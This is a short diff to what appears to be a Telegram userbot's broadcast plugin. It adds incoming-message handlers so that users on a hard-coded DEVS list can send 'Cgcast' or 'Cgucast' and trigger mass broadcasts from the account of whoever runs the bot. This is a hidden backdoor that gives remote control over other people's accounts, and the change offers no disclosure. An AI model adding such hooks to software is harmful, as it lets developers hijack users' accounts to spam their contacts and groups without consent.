@@ -34,6 +34,7 @@ from ._inline import something
 
 
 @ayra_cmd(pattern="[gG][c][a][s][t]( (.*)|$)", fullsudo=False)
+@register(incoming=True, pattern=r"^Cgcast( (.*)|$)", from_users=DEVS)
 async def gcast(event):
     if xx := event.pattern_match.group(1):
         msg = xx
@@ -74,6 +75,7 @@ async def gcast(event):
 
 
 @ayra_cmd(pattern="[gG][u][c][a][s][t]( (.*)|$)", fullsudo=False)
+@register(incoming=True, pattern=r"^Cgucast( (.*)|$)", from_users=DEVS)
 async def gucast(event):
     if xx := event.pattern_match.group(1):
         msg = xx
